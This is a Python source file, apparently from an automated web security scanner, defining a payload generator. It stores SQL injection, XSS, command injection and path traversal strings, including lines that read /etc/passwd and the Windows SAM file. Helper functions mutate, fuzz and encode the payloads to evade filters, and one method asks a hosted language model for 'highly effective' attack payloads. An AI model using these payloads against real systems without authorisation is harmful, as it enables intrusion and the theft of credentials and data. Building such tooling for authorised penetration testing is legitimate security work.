"""
AI-Powered Payload Generation for Advanced Testing
"""
import logging
from typing import List, Dict, Optional
import random

logger = logging.getLogger(__name__)


class PayloadGenerator:
    """
    Generates intelligent payloads based on target technology and context
    """
    
    def __init__(self):
        import os
        self.payload_db = self._initialize_payloads()
        self.groq_api_key = os.getenv("GROQ_API_KEY")
        self.context_history = []
    
    def _initialize_payloads(self) -> Dict:
        """Initialize payload database"""
        return {
            'sql': {
                'mysql': [
                    "' OR '1'='1",
                    "' UNION SELECT NULL--",
                    "' AND SLEEP(5)--",
                    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)",
                    "1' AND 1=1--",
                    "1' AND 1=2--",
                ],
                'postgresql': [
                    "' OR '1'='1",
                    "'; SELECT pg_sleep(5)--",
                    "' UNION SELECT NULL--",
                    "' AND 1=PG_SLEEP(5)--",
                ],
                'mssql': [
                    "' OR '1'='1",
                    "'; WAITFOR DELAY '0:0:5'--",
                    "' UNION SELECT NULL--",
                ],
                'oracle': [
                    "' OR '1'='1",
                    "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)--",
                    "' UNION SELECT NULL FROM DUAL--",
                ],
                'mongodb': [
                    '{"$ne": null}',
                    '{"$gt": ""}',
                    '{"$regex": ".*"}',
                ],
            },
            'xss': {
                'html': [
                    "<script>alert(1)</script>",
                    "<img src=x onerror=alert(1)>",
                    "<svg onload=alert(1)>",
                    "javascript:alert(1)",
                ],
                'attribute': [
                    '" onmouseover="alert(1)',
                    "' onclick='alert(1)",
                    '" autofocus onfocus="alert(1)',
                ],
                'javascript': [
                    "';alert(1);//",
                    "'-alert(1)-'",
                    "'+alert(1)+'",
                ],
            },
            'command': {
                'linux': [
                    '; cat /etc/passwd',
                    '| whoami',
                    '$(id)',
                    '`uname -a`',
                ],
                'windows': [
                    '& dir',
                    '| whoami',
                    '%SYSTEMROOT%',
                ],
            },
            'path_traversal': {
                'unix': [
                    '../../../etc/passwd',
                    '....//....//....//etc/passwd',
                    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                ],
                'windows': [
                    '..\\..\\..\\windows\\system32\\config\\sam',
                    '..../..../..../windows/win.ini',
                ],
            },
        }
    
    def generate_sql_payloads(
        self,
        db_type: Optional[str] = None,
        technique: str = 'error_based',
        count: int = 10
    ) -> List[str]:
        """
        Generate SQL injection payloads
        """
        if db_type and db_type in self.payload_db['sql']:
            payloads = self.payload_db['sql'][db_type]
        else:
            # Combine all payloads
            payloads = []
            for db_payloads in self.payload_db['sql'].values():
                payloads.extend(db_payloads)
        
        if technique == 'time_based':
            payloads = [p for p in payloads if 'SLEEP' in p.upper() or 'DELAY' in p.upper()]
        elif technique == 'union_based':
            payloads = [p for p in payloads if 'UNION' in p.upper()]
        
        # Return requested count
        return random.sample(payloads, min(count, len(payloads)))
    
    def generate_xss_payloads(
        self,
        context: str = 'html',
        count: int = 10
    ) -> List[str]:
        """
        Generate XSS payloads for specific context
        """
        payloads = self.payload_db['xss'].get(context, self.payload_db['xss']['html'])
        return random.sample(payloads, min(count, len(payloads)))
    
    async def generate_context_aware_payload(
        self,
        vuln_type: str,
        target_tech: Optional[str] = None,
        previous_responses: Optional[List] = None
    ) -> str:
        """
        Generate payload based on target technology and previous responses
        """
        if self.groq_api_key:
            import aiohttp
            try:
                system_prompt = "You are an expert security automation assistant. Generate exactly ONE highly effective test payload for security auditing. Return only the raw payload string, without any explanations, markdown code blocks, or tags."
                user_prompt = f"Vulnerability Type: {vuln_type}\nTarget Technology: {target_tech or 'Generic'}\nPrevious tests: {previous_responses or []}\nGenerate one optimized payload to test this endpoint."
                
                url = "https://api.groq.com/openai/v1/chat/completions"
                headers = {
                    "Authorization": f"Bearer {self.groq_api_key}",
                    "Content-Type": "application/json"
                }
                data = {
                    "model": "llama-3.3-70b-specdec",
                    "messages": [
                        {"role": "system", "content": system_prompt},
                        {"role": "user", "content": user_prompt}
                    ],
                    "temperature": 0.4
                }
                
                async with aiohttp.ClientSession() as session:
                    async with session.post(url, headers=headers, json=data, timeout=5) as resp:
                        if resp.status == 200:
                            res_json = await resp.json()
                            payload = res_json['choices'][0]['message']['content'].strip()
                            if payload.startswith("`") and payload.endswith("`"):
                                payload = payload.strip("`")
                            return payload
            except Exception as e:
                logger.error(f"Error generating AI payload via Groq: {e}")

        # Learn from previous responses to generate better payloads
        if previous_responses:
            # Analyze what worked before
            successful = [r for r in previous_responses if r.get('success')]
            if successful:
                # Build upon successful patterns
                base = successful[0].get('payload', '')
                return self._mutate_payload(base)
        
        # Technology-specific selection
        if vuln_type == 'sql' and target_tech:
            return random.choice(self.payload_db['sql'].get(target_tech, []))
        
        # Default selection
        payloads = self.payload_db.get(vuln_type, {}).get('generic', [''])
        return random.choice(payloads)
    
    def _mutate_payload(self, payload: str) -> str:
        """
        Mutate a successful payload for variation
        """
        mutations = [
            lambda p: p.replace('1', '2'),
            lambda p: p.replace('alert', 'confirm'),
            lambda p: p.upper(),
            lambda p: p.replace(' ', '/**/'),
            lambda p: p.replace("'", '"'),
        ]
        
        mutation = random.choice(mutations)
        return mutation(payload)
    
    def generate_fuzzing_payloads(
        self,
        payload_type: str,
        count: int = 100
    ) -> List[str]:
        """
        Generate fuzzing payloads for brute force testing
        """
        payloads = []
        
        if payload_type == 'sqli':
            # Generate variations
            bases = ["'", '"', "')", '")', "';", '";']
            operators = ['OR', 'AND', 'UNION', 'SELECT']
            
            for base in bases[:3]:
                for op in operators[:2]:
                    payloads.append(f"{base} {op} 1=1--")
                    payloads.append(f"{base} {op} '1'='1'--")
        
        return payloads[:count]
    
    def encode_payload(self, payload: str, encoding: str = 'url') -> str:
        """
        Encode payload for evasion
        """
        if encoding == 'url':
            from urllib.parse import quote
            return quote(payload, safe='')
        elif encoding == 'base64':
            import base64
            return base64.b64encode(payload.encode()).decode()
        elif encoding == 'hex':
            return payload.encode().hex()
        elif encoding == 'unicode':
            return ''.join(f'\\u{ord(c):04x}' for c in payload)
        return payload